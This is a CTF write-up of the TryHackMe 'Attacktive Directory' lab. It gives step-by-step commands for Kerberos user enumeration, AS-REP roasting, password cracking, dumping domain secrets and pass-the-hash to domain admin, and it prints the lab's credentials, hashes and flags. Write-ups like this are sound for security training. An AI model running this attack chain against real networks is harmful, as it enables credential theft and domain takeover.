---
layout: writeup
name: "AttacktiveDirectory"
platform: "TryHackMe"
category: "thm"
difficulty: "Easy"
permalink: /writeups/thm/attacktivedirectory/
os: "TryHackMe"
tags: [Active Directory / Windows]
date: 2025-11-12
pwned: true
---
# 🧪 TryHackMe: Attacktive Directory

**Platform:** TryHackMe  
**IP Address:** `10.201.3.44`  
**Difficulty:** Easy  
**Category:** Active Directory / Windows

---

## 🧭 Overview

A beginner-friendly Windows Active Directory machine focused on Kerberos pre-auth attacks, password cracking, SMB enumeration, and eventual domain compromise using extracted credentials. Classic enumeration-to-own workflow, with useful tooling reminders along the way.

---

## 🔍 Enumeration

### 🔎 RustScan

```bash
rustscan --ulimit 5000 -a $target -- -sC -sV -Pn -oN nmap_full
```

**Ports Identified:**
- LDAP: 389, 636, 3268, 3269
- Kerberos: 88, 464
- WinRM: 5985
- SMB: 139, 445
- RDP: 3389
- HTTP: 80
- DNS: 53
- RPC: Multiple high ports

### 🔎 Kerberos User Enumeration

```bash
kerbrute userenum userlist.txt --dc $target -d spookysec.local
```

**Valid Users Found:**
- james  
- svc-admin  
- James  
- robin  
- darkstar  
- administrator  
- backup  
- paradox  

---

## 💥 Exploitation

### 🔐 AS-REP Roasting

```bash
GetNPUsers.py spookysec.local/ -no-pass -usersfile userlist.txt -dc-ip $target
```

Found hash for: `svc-admin@SPOOKYSEC.LOCAL`

### 🔓 Cracking with John

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
# Password: management2005
```

### 🔁 WinRM (Failed), SMB (Success)

```bash
netexec winrm $target -u 'svc-admin' -p 'management2005'
netexec smb $target -u 'svc-admin' -p 'management2005' --shares
```

### 📁 Downloading Credentials via SMB

```bash
smbclient -U 'svc-admin' \\$target\backup
# File: backup_credentials.txt
echo 'YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw' | base64 -d
# => backup@spookysec.local:backup2517860
```

### 🖥️ RDP with Backup User

```bash
xfreerdp3 /v:$target /u:"backup" /p:"backup2517860"
# User flag: TryHackMe{K3rb3r0s_Pr3_4uth}
```

---

## 🚪 Privilege Escalation

### 🧂 Secrets Dump

```bash
secretsdump.py spookysec.local/backup:'backup2517860'@$target
# Extracted Administrator hash: aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
```

### 🛠️ Psexec

```bash
psexec.py spookysec.local/administrator@$target -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
```

**Root Flag:**  
```text
TryHackMe{4ctiveD1rectoryM4st3r}
```

---

## 🧠 Lessons Learned

- Use `kerbrute` to quickly confirm usernames for Kerberos attacks.
- `GetNPUsers.py` + `john` is the go-to combo for AS-REP Roasting.
- `netexec` is a brilliant tool for testing WinRM, SMB, RDP, etc.
- RDP can sometimes be available even when WinRM isn’t.
- Reuse of credentials in readable SMB shares can lead to escalation.
- Always dump hashes and test pass-the-hash routes for domain admin access.

---

## 🛠️ Toolbox

| Tool           | Purpose                                |
|----------------|----------------------------------------|
| `rustscan`     | Fast port discovery                    |
| `kerbrute`     | Kerberos username enumeration          |
| `GetNPUsers.py`| AS-REP Roasting                        |
| `john`         | Offline password cracking              |
| `netexec`      | Service access testing (smb, winrm)    |
| `smbclient`    | Manual file download                   |
| `xfreerdp3`    | RDP client                             |
| `secretsdump.py`| Hash dump via DRSUAPI                 |
| `psexec.py`    | Remote command execution using hashes  |

---

![Proof](https://raw.githubusercontent.com/inkedqt/ctf-writeups/main/THM/proofs/attacktivedirectory.png)